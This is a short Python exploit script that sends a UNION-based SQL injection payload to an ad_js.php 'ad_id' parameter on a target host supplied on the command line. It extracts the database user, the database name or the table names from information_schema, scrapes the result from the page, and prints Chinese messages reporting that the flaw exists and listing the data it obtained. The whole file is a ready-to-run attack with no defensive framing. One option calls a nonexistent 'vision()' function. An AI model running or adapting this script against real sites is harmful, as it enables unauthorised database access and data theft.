import requests
import re
import sys

ip = sys.argv[1]
port = sys.argv[2]
ex = sys.argv[3]

ml = 0
if ex == "user":
    ml = "user()"
elif ex == "db":
    ml = "database()"
elif ex == "vision":
    ml = "vision()"
elif ex == "tb":
    ml = "(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())"


url = f"http://{ip}:{port}/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,{ml}"

header ={
    "user-agent":"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 Edg/103.0.1264.37"
}

resp = requests.get(url,headers=header)
if resp.status_code != 200:
    print("漏洞不存在")
resp.close()

resp = resp.text

obj = re.compile(r'<!--.*?document.write\("(?P<data>.*?)"\).*?-->',re.S)

result = obj.finditer(resp)
data = 0
for i in  result:
    data = i.group("data").split(",")
for j in data:
    print(f"漏洞存在，获取的数据为:{j}")
